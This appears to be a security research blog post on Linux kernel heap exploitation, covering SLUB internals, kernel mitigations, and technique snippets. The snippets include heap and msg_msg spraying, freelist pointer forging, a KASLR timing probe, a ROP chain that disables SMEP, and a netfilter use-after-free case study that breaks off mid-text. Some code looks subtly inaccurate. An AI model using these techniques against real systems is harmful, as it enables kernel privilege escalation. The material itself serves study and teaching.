<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>Linux Kernel Heap Exploitation in 2024 - gracecondition</title>
    <meta name="description" content="OS internals, binary exploitation, and low-level security research">

    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">

    

    
</head>
<body>
    <div class="site-container">
        <header class="site-header">
    <nav class="navbar">
        <div class="nav-container">
            <a href="http://localhost:1313/" class="nav-brand">
                <h1>gracecondition</h1>
            </a>

            <div class="nav-menu" id="nav-menu">
                <a href="http://localhost:1313/" class="nav-link">Home</a>
                <a href="/posts/" class="nav-link">Posts</a>
                <a href="/ctf/" class="nav-link">CTF Solutions</a>
                <a href="/about/" class="nav-link">About</a>
            </div>

            <div class="nav-toggle" id="nav-toggle">
                <span class="bar"></span>
                <span class="bar"></span>
                <span class="bar"></span>
            </div>
        </div>
    </nav>
</header>

        <main class="main-content">
            
<div class="content-with-toc">
    <aside class="toc-sidebar">
    <div class="toc-content">
        
        <div class="toc-section">
            <h3 class="toc-title">ðŸ“– Contents</h3>
            <nav class="toc-nav" id="toc-nav">
                
                <div class="toc-loading">Generating table of contents...</div>
            </nav>
        </div>

        
        <div class="toc-section">
            <h4 class="toc-subtitle">Article Info</h4>
            <div class="article-info">
                <div class="info-item">
                    <span class="info-label">Published:</span>
                    <time class="info-value">Sep 20, 2024</time>
                </div>
                
                <div class="info-item">
                    <span class="info-label">Read time:</span>
                    <span class="info-value">6 min</span>
                </div>
                
                
                <div class="info-item">
                    <span class="info-label">Words:</span>
                    <span class="info-value">1155</span>
                </div>
                
                
                <div class="info-item">
                    <span class="info-label">Category:</span>
                    <span class="info-value category-research">Research</span>
                </div>
                
            </div>
        </div>

        
        

        
        
        <div class="toc-section">
            <h4 class="toc-subtitle">Tags</h4>
            <div class="toc-tags">
                
                <a href="/tags/kernel-exploitation/" class="toc-tag">#kernel-exploitation</a>
                
                <a href="/tags/linux/" class="toc-tag">#linux</a>
                
                <a href="/tags/heap/" class="toc-tag">#heap</a>
                
                <a href="/tags/kmalloc/" class="toc-tag">#kmalloc</a>
                
                <a href="/tags/slab/" class="toc-tag">#slab</a>
                
            </div>
        </div>
        

        
        <div class="toc-section">
            <h4 class="toc-subtitle">Progress</h4>
            <div class="reading-progress-container">
                <div class="progress-bar">
                    <div class="progress-fill" id="progress-fill"></div>
                </div>
                <div class="progress-text">
                    <span id="progress-percentage">0%</span>
                    <span class="progress-label">completed</span>
                </div>
            </div>
        </div>

        
        <div class="toc-section">
            <h4 class="toc-subtitle">Related</h4>
            <div class="related-posts">
                
                
                <article class="related-post">
                    <a href="http://localhost:1313/ctf/defcon-31/kernel-nightmare/" class="related-post-link">
                        <span class="related-post-icon">
                            ðŸš©
                            
                        </span>
                        <div class="related-post-content">
                            <h5 class="related-post-title">kernel-nightmare</h5>
                            <time class="related-post-date">Aug 12</time>
                        </div>
                    </a>
                </article>
                
            </div>
        </div>

    </div>
</aside>

    <article class="single-post">
        <header class="post-header">
            <div class="post-meta-badge">
                
                    <span class="research-badge">ðŸ”¬ Research</span>
                
            </div>

            <h1 class="post-title-single">Linux Kernel Heap Exploitation in 2024</h1>

            <div class="post-meta-single">
                <time datetime="2024-09-20">September 20, 2024</time>
                
                <span> â€¢ </span>
                <span>6 min read</span>
                
                
                <span> â€¢ </span>
                <div class="inline-tags">
                    
                    <span class="inline-tag">#kernel-exploitation</span>
                    
                    <span class="inline-tag">#linux</span>
                    
                    <span class="inline-tag">#heap</span>
                    
                    <span class="inline-tag">#kmalloc</span>
                    
                    <span class="inline-tag">#slab</span>
                    
                </div>
                
            </div>
        </header>

        <div class="post-body" id="post-content">
            <h1 id="linux-kernel-heap-exploitation-in-2024">Linux Kernel Heap Exploitation in 2024</h1>
<p>The Linux kernel heap has undergone significant changes in recent years, with new mitigations and allocator improvements making exploitation increasingly challenging. This post explores the current state of kernel heap exploitation, focusing on the SLUB allocator and modern bypass techniques.</p>
<h2 id="slub-allocator-internals">SLUB Allocator Internals</h2>
<h3 id="basic-structure">Basic Structure</h3>
<p>The SLUB (SLab Unification) allocator is the default kernel heap allocator in modern Linux systems:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> kmem_cache {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> kmem_cache_cpu <span style="color:#f92672">*</span>cpu_slab;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> size;          <span style="color:#75715e">// Object size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> object_size;   <span style="color:#75715e">// Real object size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> offset;        <span style="color:#75715e">// Free pointer offset
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// ... more fields
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> kmem_cache_cpu {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>freelist;    <span style="color:#75715e">// Pointer to first free object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>page;  <span style="color:#75715e">// Current slab page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>partial; <span style="color:#75715e">// Partial slabs
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> page {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>freelist;     <span style="color:#75715e">// Free objects in this page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> inuse;    <span style="color:#75715e">// Number of allocated objects
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> objects;  <span style="color:#75715e">// Total objects in page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        };
</span></span><span style="display:flex;"><span>    };
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> kmem_cache <span style="color:#f92672">*</span>slab_cache;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... more fields
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><h3 id="allocation-flow">Allocation Flow</h3>
<p>Understanding the allocation process is crucial for exploitation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Simplified kmalloc flow
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">kmalloc</span>(size_t size, gfp_t flags) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> kmem_cache <span style="color:#f92672">*</span>cache <span style="color:#f92672">=</span> kmalloc_caches[size];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> __slab_alloc(cache, flags);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">__slab_alloc</span>(<span style="color:#66d9ef">struct</span> kmem_cache <span style="color:#f92672">*</span>cache, gfp_t flags) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> page <span style="color:#f92672">*</span>page <span style="color:#f92672">=</span> cache<span style="color:#f92672">-&gt;</span>cpu_slab<span style="color:#f92672">-&gt;</span>page;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>page<span style="color:#f92672">-&gt;</span>freelist) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Need new page
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        page <span style="color:#f92672">=</span> allocate_slab(cache, flags);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>object <span style="color:#f92672">=</span> page<span style="color:#f92672">-&gt;</span>freelist;
</span></span><span style="display:flex;"><span>    page<span style="color:#f92672">-&gt;</span>freelist <span style="color:#f92672">=</span> get_freepointer(cache, object);
</span></span><span style="display:flex;"><span>    page<span style="color:#f92672">-&gt;</span>inuse<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> object;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="modern-mitigations">Modern Mitigations</h2>
<h3 id="1-kaslr-kernel-address-space-layout-randomization">1. KASLR (Kernel Address Space Layout Randomization)</h3>
<p>KASLR randomizes the kernel base address, making it harder to predict code and data locations:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check KASLR status</span>
</span></span><span style="display:flex;"><span>$ cat /proc/cmdline | grep nokaslr
</span></span><span style="display:flex;"><span><span style="color:#75715e"># If empty, KASLR is enabled</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># KASLR entropy on x86_64</span>
</span></span><span style="display:flex;"><span>$ dmesg | grep <span style="color:#e6db74">&#34;KASLR&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>    0.000000<span style="color:#f92672">]</span> KASLR using RDRAND RDTSC...
</span></span></code></pre></div><h3 id="2-smepsmap-supervisor-mode-executionaccess-prevention">2. SMEP/SMAP (Supervisor Mode Execution/Access Prevention)</h3>
<p>These features prevent kernel from executing user code or accessing user data:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// SMEP prevents this:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>func_ptr)(<span style="color:#66d9ef">void</span>) <span style="color:#f92672">=</span> userspace_address;
</span></span><span style="display:flex;"><span>func_ptr(); <span style="color:#75715e">// Page fault!
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// SMAP prevents this:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>user_data <span style="color:#f92672">=</span> userspace_buffer;
</span></span><span style="display:flex;"><span>strcpy(kernel_buffer, user_data); <span style="color:#75715e">// Page fault!
</span></span></span></code></pre></div><h3 id="3-kpti-kernel-page-table-isolation">3. KPTI (Kernel Page Table Isolation)</h3>
<p>KPTI separates user and kernel page tables, mitigating Meltdown-style attacks:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /sys/devices/system/cpu/vulnerabilities/meltdown
</span></span><span style="display:flex;"><span>Mitigation: PTI
</span></span></code></pre></div><h3 id="4-slub-freelist-hardening">4. SLUB Freelist Hardening</h3>
<p>Modern kernels implement freelist pointer obfuscation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Freelist pointers are XORed with a random value
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">freelist_dereference</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> kmem_cache <span style="color:#f92672">*</span>s, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr_addr) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)ptr_addr <span style="color:#f92672">^</span> s<span style="color:#f92672">-&gt;</span>random <span style="color:#f92672">^</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)ptr_addr);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="exploitation-techniques">Exploitation Techniques</h2>
<h3 id="1-cross-cache-attacks">1. Cross-Cache Attacks</h3>
<p>When direct heap corruption isn&rsquo;t possible, cross-cache attacks can be effective:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Spray target cache
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    spray_objects[i] <span style="color:#f92672">=</span> kmalloc(target_size, GFP_KERNEL);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Create holes in spray
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    kfree(spray_objects[i]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Allocate vulnerable objects to fill holes
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>vulnerable_object <span style="color:#f92672">=</span> kmalloc(target_size, GFP_KERNEL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Trigger vulnerability to corrupt adjacent objects
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>trigger_overflow(vulnerable_object);
</span></span></code></pre></div><h3 id="2-freelist-manipulation">2. Freelist Manipulation</h3>
<p>Despite hardening, freelist manipulation is still possible with arbitrary write:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Bypass freelist obfuscation
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>fake_freelist <span style="color:#f92672">=</span> target_address <span style="color:#f92672">^</span> cache<span style="color:#f92672">-&gt;</span>random <span style="color:#f92672">^</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>)<span style="color:#f92672">&amp;</span>fake_freelist;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Overwrite freelist pointer
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)corrupted_object <span style="color:#f92672">=</span> fake_freelist;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Next allocation returns our target address
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>controlled <span style="color:#f92672">=</span> kmalloc(cache<span style="color:#f92672">-&gt;</span>size, GFP_KERNEL);
</span></span></code></pre></div><h3 id="3-physmap-spray">3. Physmap Spray</h3>
<p>Using the physmap for reliable exploitation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Find physmap base (typically 0xffff888000000000 on x86_64)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> physmap_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffff888000000000</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Spray physical memory
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> addr <span style="color:#f92672">=</span> physmap_base; addr <span style="color:#f92672">&lt;</span> physmap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40000000</span>; addr <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x1000</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (probe_kernel_address((<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)addr)) {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Valid physmap address, spray here
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        spray_physmap(addr);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="4-msg_msg-exploitation">4. msg_msg Exploitation</h3>
<p>The <code>msg_msg</code> structure is particularly useful for exploitation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> msg_msg {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> list_head m_list;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> m_type;
</span></span><span style="display:flex;"><span>    size_t m_ts;        <span style="color:#75715e">// Total size
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> msg_msgseg <span style="color:#f92672">*</span>next;
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Message data follows
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Spray msg_msg objects
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> msgid <span style="color:#f92672">=</span> msgget(IPC_PRIVATE, <span style="color:#ae81ff">0644</span> <span style="color:#f92672">|</span> IPC_CREAT);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1000</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> msgbuf <span style="color:#f92672">*</span>msg <span style="color:#f92672">=</span> malloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">struct</span> msgbuf) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    msg<span style="color:#f92672">-&gt;</span>mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    memset(msg<span style="color:#f92672">-&gt;</span>mtext, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0x1000</span>);
</span></span><span style="display:flex;"><span>    msgsnd(msgid, msg, <span style="color:#ae81ff">0x1000</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="advanced-bypass-techniques">Advanced Bypass Techniques</h2>
<h3 id="1-kaslr-bypass-via-timing-attacks">1. KASLR Bypass via Timing Attacks</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Measure cache timing to determine kernel base
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">probe_kernel_base</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> base_candidates[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xffffffff81000000</span>, <span style="color:#ae81ff">0xffffffff82000000</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xffffffff83000000</span>, <span style="color:#ae81ff">0xffffffff84000000</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ... more candidates
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> ARRAY_SIZE(base_candidates); i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> start <span style="color:#f92672">=</span> rdtsc();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Attempt to access potential kernel code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">asm</span> <span style="color:#66d9ef">volatile</span>(<span style="color:#e6db74">&#34;prefetch (%0)&#34;</span> <span style="color:#f92672">:</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;r&#34;</span>(base_candidates[i]));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> end <span style="color:#f92672">=</span> rdtsc();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Kernel code typically has better cache locality
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ((end <span style="color:#f92672">-</span> start) <span style="color:#f92672">&lt;</span> TIMING_THRESHOLD) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> base_candidates[i];
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="2-smep-bypass-via-rop">2. SMEP Bypass via ROP</h3>
<p>Build ROP chains using kernel gadgets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Find useful gadgets
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> pop_rdi_ret <span style="color:#f92672">=</span> find_gadget(<span style="color:#e6db74">&#34;pop %rdi; ret&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> pop_rsi_ret <span style="color:#f92672">=</span> find_gadget(<span style="color:#e6db74">&#34;pop %rsi; ret&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> mov_cr4_rdi <span style="color:#f92672">=</span> find_gadget(<span style="color:#e6db74">&#34;mov %rdi, %cr4; ret&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Disable SMEP by clearing CR4.SMEP bit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> rop_chain[] <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    pop_rdi_ret,
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x406f0</span>,  <span style="color:#75715e">// CR4 value with SMEP disabled
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    mov_cr4_rdi,
</span></span><span style="display:flex;"><span>    userspace_shellcode  <span style="color:#75715e">// Now we can execute userspace code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
</span></span></code></pre></div><h3 id="3-arbitrary-read-via-seq_operations">3. Arbitrary Read via seq_operations</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Overwrite seq_operations function pointers
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> seq_operations {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>start)(<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, loff_t <span style="color:#f92672">*</span>pos);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>stop)(<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>next)(<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v, loff_t <span style="color:#f92672">*</span>pos);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>show)(<span style="color:#66d9ef">struct</span> seq_file <span style="color:#f92672">*</span>m, <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>v);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Spray seq_file objects
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;/proc/self/stat&#34;</span>, O_RDONLY);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Overwrite seq_operations-&gt;start with arbitrary read gadget
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// When read() is called, our gadget executes
</span></span></span></code></pre></div><h2 id="case-study-cve-2022-32250">Case Study: CVE-2022-32250</h2>
<p>Let&rsquo;s examine a recent netfilter use-after-free vulnerability:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Vulnerable code in nf_tables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">nft_set_destroy</span>(<span style="color:#66d9ef">struct</span> nft_set <span style="color:#f92672">*</span>set) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (set<span style="color:#f92672">-&gt;</span>ops<span style="color:#f92672">-&gt;</span>destroy)
</span></span><span style="display:flex;"><span>        set<span style="color:#f92672">-&gt;</span>ops<span style="color:#f92672">-&gt;</span>destroy(set);  <span style="color:#75715e">// Use-after-free here
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// ... rest of cleanup
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Exploitation strategy:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 1. Create netfilter set
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 2. Trigger set destruction
